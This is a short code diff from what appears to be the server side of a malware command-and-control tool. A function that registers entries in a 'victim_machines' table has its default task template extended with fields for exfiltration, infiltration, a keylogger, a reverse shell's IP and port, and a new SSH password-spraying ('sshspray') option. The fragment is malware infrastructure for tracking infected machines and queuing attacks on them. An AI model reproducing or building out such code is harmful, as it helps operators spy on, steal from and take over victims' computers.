@@ -51,7 +51,7 @@ def updategroup( id, group_id ):
 			print("id not found in the database")
 			print("creating new entry in database...")
 			empty_json = "e30="
-			formatted_command = "{\"commands\": {}, \"exfiltrate\": {}, \"infiltrate\": {}, \"keylogger\": \"\", \"shell\": {\"ip\": \"\", \"port\": \"\"}}"
+			formatted_command = "{\"commands\": {}, \"exfiltrate\": {}, \"infiltrate\": {}, \"keylogger\": \"\", \"shell\": {\"ip\": \"0.0.0.0\", \"port\": \"0\"}, \"sshspray\": \"0\"}"
 			formatted_encoded = encode(formatted_command)
 
 			create_query = """ INSERT INTO victim_machines (victim_id, group_id, command, command_output, command_record, file_names) VALUES (%s, %s, %s, %s, %s, %s) """
